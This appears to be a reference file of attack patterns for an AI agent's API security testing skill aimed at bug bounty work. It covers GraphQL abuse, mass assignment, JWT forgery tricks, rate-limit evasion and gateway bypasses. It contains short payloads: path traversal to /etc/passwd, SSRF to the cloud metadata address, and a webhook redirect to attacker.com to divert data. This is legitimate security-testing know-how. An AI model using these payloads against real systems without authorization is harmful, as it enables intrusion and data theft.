# Advanced API Security Patterns

Deep-dive testing patterns for API vulnerability classes that pay bounties. Reference file for the api-security skill.

> **Related files:** [SKILL.md](../SKILL.md) for core API testing patterns | [auth-testing](../../auth-testing/SKILL.md) for BOLA/BFLA | [vuln-patterns](../../vuln-patterns/SKILL.md) for general web patterns

---

## GraphQL Advanced Patterns

### Persisted Query Abuse

```
Persisted queries cache query strings server-side. Test for:

1. Query ID enumeration
   GET /graphql?extensions={"persistedQuery":{"version":1,"sha256Hash":"abc123"}}
   → Brute-force hashes to discover cached queries

2. Persisted query registration
   POST /graphql with {"query":"...", "extensions":{"persistedQuery":{"version":1,"sha256Hash":"new_hash"}}}
   → Can you register your own persisted query?

3. APQ (Automatic Persisted Queries) cache poisoning
   → Register a malicious query with a legitimate hash
   → Other clients fetching by hash get your query instead

4. Persisted query bypass
   → If only persisted queries allowed, try direct query with different Content-Type
   → application/graphql vs application/json
```

### Federated GraphQL / Gateway Attacks

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | Service discovery | Introspect gateway for `_service` and `_entities` fields | Exposed microservice names and types |
| 2 | Direct subgraph access | Try accessing subgraph URLs directly (often on different ports) | Missing gateway auth on individual services |
| 3 | Entity reference bypass | Use `_entities` with `__typename` and key fields to fetch any entity | Cross-service IDOR via federation |
| 4 | Representation injection | Modify `__typename` in entity queries to target different services | Access unauthorized service data |
| 5 | Federation directive abuse | Check for `@external`, `@requires`, `@provides` in schema | Fields fetched across service boundaries may skip auth |

### GraphQL File Upload

```
GraphQL multipart request specification (graphql-multipart-request-spec):

1. Test for path traversal in upload filename
   → Content-Disposition: form-data; name="0"; filename="../../../etc/passwd"

2. Test for unrestricted file types
   → Upload .html, .svg (stored XSS), .php, .jsp

3. Test for SSRF via file URL
   → Some implementations accept URL instead of file: {"url": "http://169.254.169.254/..."}

4. Test for DoS via large file / many files
   → Batch upload endpoint may lack per-file or total size limits
```

---

## REST API Advanced Patterns

### Mass Assignment Deep Dive

The #1 underexplored REST API vulnerability. Many frameworks automatically bind request parameters to model fields.

**Discovery:**
```
1. Find all writable endpoints (POST, PUT, PATCH)
2. Get the response schema — what fields come back?
3. Send back ALL response fields in the request body
4. Add fields from error messages, debug output, or docs

High-value fields to inject:
- role, is_admin, admin, permissions, verified
- email_verified, phone_verified, kyc_status
- plan, tier, subscription_level, credits
- org_id, tenant_id, company_id (cross-tenant)
- internal, debug, test, sandbox (feature flags)
- password, password_hash (password reset without email)
- created_at, updated_at (timestamp manipulation)
- status, state, approved (workflow bypass)
```

**Framework-Specific Vectors:**
| Framework | Vector | Why it works |
|-----------|--------|-------------|
| Rails | Nested attributes: `user[profile_attributes][admin]=true` | `accepts_nested_attributes_for` often lacks attribute filtering |
| Django | `serializer.save(**validated_data)` | Custom fields not in serializer still passed to model |
| Express + Mongoose | `Model.findByIdAndUpdate(id, req.body)` | Direct request body passed to database update |
| Laravel | `$model->fill($request->all())` | `$fillable` / `$guarded` misconfiguration |
| Spring Boot | `@ModelAttribute` with `@RequestBody` | Automatic binding to POJO without field filtering |

### JSON API Specification Abuse

```
JSON:API (jsonapi.org) spec features that create attack surface:

1. Include sideloading
   ?include=author,author.company,author.company.billing
   → Chain relationships to access restricted data

2. Sparse fieldsets
   ?fields[users]=email,ssn,password_hash
   → Request fields not in default response

3. Filter operators
   ?filter[password][$regex]=^admin
   ?filter[credit_card][$gt]=4000000000000000
   → Boolean-based data extraction via filter operators

4. Sort-based information disclosure
   ?sort=password → 200 OK = field exists, error = doesn't
   ?sort=-balance → Reveals highest balance users first
```

### HATEOAS / Hypermedia Exploitation

```
Hypermedia APIs expose action links in responses. Test:

1. Follow _links to actions you shouldn't have
   → Response includes {"_links": {"approve": {"href": "/orders/123/approve"}}}
   → Does following the link actually work without proper auth?

2. Link template manipulation
   → {"_links": {"self": {"href": "/users/{id}", "templated": true}}}
   → Replace {id} with other users' IDs

3. Embedded resource access
   → "_embedded" objects may include data not normally accessible
   → Check if embedded resources skip field-level auth
```

---

## API Authentication Bypass Patterns

### JWT-Specific API Patterns

| # | Test | Payload | What to look for |
|---|------|---------|-----------------|
| 1 | Algorithm confusion | Change `"alg":"RS256"` to `"alg":"HS256"`, sign with public key | Server accepts HMAC signature with RSA public key |
| 2 | JWK header injection | Add `"jwk"` to header with your public key | Server uses attacker-supplied key for verification |
| 3 | `jku` header injection | Point `"jku"` to attacker-controlled URL hosting JWK set | Server fetches keys from attacker |
| 4 | `kid` path traversal | Set `"kid": "../../../dev/null"` or `"kid": "../../public/key"` | Server reads wrong key file |
| 5 | Cross-service token reuse | Token from Service A used on Service B | Shared signing keys across microservices |
| 6 | Expired token acceptance | Send token with `exp` in the past | Server doesn't validate expiry |
| 7 | Claim escalation | Modify `role`, `scope`, `permissions` in payload | Server trusts unverified claims |

### API Key Management Flaws

```
API key patterns that pay bounties:

1. Key in URL parameters (appears in logs, referer headers)
   GET /api/data?api_key=sk_live_xxx
   → Key leaked to third-party analytics, CDN logs, browser history

2. Key rotation doesn't invalidate old keys
   → Generate new key, test if old key still works

3. Key scope escalation
   → Read-only key used for write operations
   → Test every endpoint with every key type

4. Key in client-side code
   → JavaScript bundles, mobile app strings
   → Especially dangerous: keys with write access or admin scope

5. Shared keys across environments
   → Staging API key works in production
   → Dev key has same permissions as production
```

---

## API Rate Limiting Advanced Bypass

### Distributed Rate Limit Evasion

| # | Technique | How | Success Rate |
|---|-----------|-----|-------------|
| 1 | GraphQL alias batching | 100 aliased queries in single request | High — single request, multiple operations |
| 2 | JSON array batching | `[{"method":"GET","url":"/users/1"}, ...]` | Medium — depends on batch endpoint |
| 3 | HTTP/2 multiplexing | Multiple streams in single connection | Medium — bypasses connection-based limits |
| 4 | Unicode normalization | `/api/users` vs `/api/u\u0073ers` | Low but worth trying |
| 5 | HTTP method override | `X-HTTP-Method-Override: GET` on POST | Medium — different method = different bucket |
| 6 | Cloudflare/CDN bypass | Find origin IP, hit directly | High when origin is discoverable |
| 7 | API version splitting | Split requests across v1, v2, v3 | High — usually separate rate limit buckets |
| 8 | Subdomain rotation | api.example.com vs api2.example.com | Medium — different subdomains may share backend |

---

## Webhook and Callback Patterns

Webhooks create a reverse attack surface — the target sends requests to URLs you control.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | SSRF via webhook URL | Register webhook pointing to `http://169.254.169.254/...` | Server fetches internal metadata |
| 2 | Webhook secret bypass | Replay webhook without HMAC signature | Server doesn't verify webhook authenticity |
| 3 | Webhook URL injection | Register `http://attacker.com?orig=` + URL-encode original | Redirect webhook data to attacker |
| 4 | Event enumeration | Subscribe to all event types, observe data | Webhooks may contain more data than API responses |
| 5 | Retry abuse | Webhook fails → server retries → time-based SSRF | Multiple internal requests from single registration |
| 6 | Callback URL SSRF | OAuth/payment callback URLs pointing to internal services | Server-side request to attacker-controlled URL |

---

## Microservice-Specific Patterns

### Service Mesh Bypass

```
In microservice architectures:

1. Direct service access
   → Services often accessible on internal ports without going through API gateway
   → If you find an SSRF, probe internal service ports (8080, 3000, 5000, 8443)

2. Service-to-service auth bypass
   → Internal services may trust each other without per-request auth
   → Proxy through one service to reach another

3. Header propagation attacks
   → X-Forwarded-For, X-Real-IP propagated through service mesh
   → Inject headers at gateway, they reach backend services unchanged

4. Sidecar proxy bypass
   → Istio/Envoy sidecars handle auth, but direct container access bypasses them
   → Container port != sidecar port
```

### API Gateway Misconfigurations

| # | Pattern | Test | Impact |
|---|---------|------|--------|
| 1 | Path normalization gap | Gateway blocks `/admin`, try `/Admin`, `/./admin`, `/%61dmin` | Gateway bypass to protected endpoints |
| 2 | Method routing mismatch | Gateway allows GET only, backend accepts POST | Bypass method-based access controls |
| 3 | Header injection via URL | `/api/users%0d%0aX-Admin:%20true` | CRLF in URL becomes header at backend |
| 4 | Trailing slash mismatch | Gateway routes `/api/users` but not `/api/users/` | Access endpoints not covered by gateway rules |
| 5 | Wildcard route abuse | Gateway allows `/api/*` but backend has `/api/../admin` | Path traversal through gateway wildcard |
| 6 | Version routing bypass | `/api/v2/users` protected, `/api/v1/users` unprotected | Old API version lacks gateway auth rules |
| 7 | Host header confusion | `Host: internal-api.corp.com` through public gateway | Access internal services via host routing |
| 8 | Chunk transfer bypass | Chunked encoding confuses gateway but backend processes | Request smuggling past API gateway (CVE-2023-25690 pattern) |

### Gateway-Specific Attack Surface

**AWS API Gateway:**
- Lambda authorizer bypass via malformed JWT — authorizer returns `Allow` on parsing errors
- Usage plan key leakage in `x-api-key` header logged by CloudWatch
- REST vs HTTP API behavior differences — HTTP API lacks certain validation

**Kong Gateway:**
- Plugin ordering exploitation — auth plugin bypassed if placed after a plugin that modifies the request
- Admin API exposure on port 8001 (default) — full gateway configuration access
- JWT plugin `conf.claims_to_verify` misconfigured → accepts expired tokens

**Cloudflare API Shield:**
- Schema validation bypass via content-type confusion — send `application/x-www-form-urlencoded` when schema expects JSON
- Rate limiting scope mismatch — per-endpoint vs per-origin differences

---

## Related Skills & Commands

- `api-security` SKILL.md — Core API testing patterns (REST, GraphQL, WebSocket, gRPC)
- `auth-testing` — BOLA/BFLA/access control testing
- `vuln-patterns` — Individual vulnerability class patterns
- `/quick-test` — Rapid single-endpoint testing
- `/generate-payload` — WAF-aware payload generation
